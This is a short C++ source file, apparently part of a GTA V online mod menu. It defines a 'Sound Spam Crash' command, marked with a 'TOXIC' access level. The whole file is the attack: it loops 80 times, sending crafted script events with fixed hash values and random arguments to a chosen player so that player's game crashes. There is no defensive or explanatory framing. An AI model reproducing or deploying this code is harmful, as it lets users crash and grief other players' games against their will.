#include "backend/player_command.hpp"
#include "natives.hpp"
#include "pointers.hpp"
#include "core/scr_globals.hpp"
#include "util/scripts.hpp"

namespace big
{
	class sound_spam_crash : player_command
	{
		using player_command::player_command;

		virtual CommandAccessLevel get_access_level()
		{
			return CommandAccessLevel::TOXIC;
		}

		virtual void execute(player_ptr player, const std::vector<std::uint64_t>& _args, const std::shared_ptr<command_context> ctx)
		{
			Player target = g_player_service->get_selected()->id();
			for (uint8_t x = 0; x < 80; x++) // 40-100
			{
				DWORD randInt = rand() % 9500;
				int64_t args[4] = { 113023613, self::id, -553629393, randInt++ };
				g_pointers->m_trigger_script_event(1, args, 4, 1 << target);
			}
		}
	};
	sound_spam_crash g_sound_spam_crash("soundspam", "Sound Spam Crash", "Blocked by most menus!", 0, false);
}